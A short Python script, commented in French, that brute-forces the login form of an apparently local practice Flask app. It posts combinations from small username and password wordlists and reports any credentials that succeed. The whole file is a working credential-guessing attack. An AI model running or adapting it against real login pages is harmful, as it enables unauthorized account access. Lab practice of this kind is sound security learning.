import requests
import os # Importe le module os pour vérifier l'existence des fichiers

# L'URL de la page de connexion de votre application Flask
LOGIN_URL = "http://127.0.0.1:5000/login"

# --- Wordlists pour le bruteforce ---
# Une liste de noms d'utilisateurs potentiels à tester
usernames = ["admin", "user", "test", "root", "guest", "administrator"]

# Une liste de mots de passe potentiels à tester
passwords = ["1234", "password", "test", "admin", "secret", "qwert", "azerty"]


print(f"Démarrage du bruteforce sur {LOGIN_URL}")
print("-" * 30)

found_credentials = []

# Itération sur chaque nom d'utilisateur
for username in usernames:
    # Itération sur chaque mot de passe pour le nom d'utilisateur actuel
    for password in passwords:
        # Données à envoyer dans la requête POST
        # Les noms des champs 'username' et 'password' doivent correspondre
        # aux attributs 'name' des balises <input> dans votre formulaire HTML
        data = {
            "username": username,
            "password": password
        }

        print(f"Tentative : username='{username}', password='{password}'")

        try:
            # Envoi de la requête POST
            response = requests.post(LOGIN_URL, data=data)

            # Vérification de la réponse du serveur
            # La page de connexion renvoie "Bienvenue, {user[1]} !" en cas de succès
            # et "Échec de connexion." en cas d'échec.
            if "Bienvenue," in response.text:
                print(f"🥳 SUCCÈS ! Identifiants trouvés : Username='{username}', Password='{password}'")
                found_credentials.append((username, password))
                # Optionnel : Si vous voulez arrêter après le premier succès, décommentez la ligne ci-dessous
                # break # Permet de sortir de la boucle des mots de passe
            elif "Échec de connexion." in response.text:
                # print(f"Échec pour {username}:{password}") # Peut être bruyant, décommenter pour voir tous les échecs
                pass # Ne rien faire pour les échecs, ou afficher un message si désiré
            else:
                print(f"Réponse inattendue pour {username}:{password} : {response.text[:100]}...")

        except requests.exceptions.RequestException as e:
            print(f"Erreur de connexion lors de la tentative {username}:{password} : {e}")
            # En cas d'erreur réseau, il peut être utile de sortir ou de faire une pause
            # pour éviter de spammer le serveur ou d'être bloqué.

print("-" * 30)
if found_credentials:
    print("Bruteforce terminé. Identifiants trouvés :")
    for creds in found_credentials:
        print(f"  Username: {creds[0]}, Password: {creds[1]}")
else:
    print("Bruteforce terminé. Aucune combinaison d'identifiants valide trouvée avec les listes fournies.")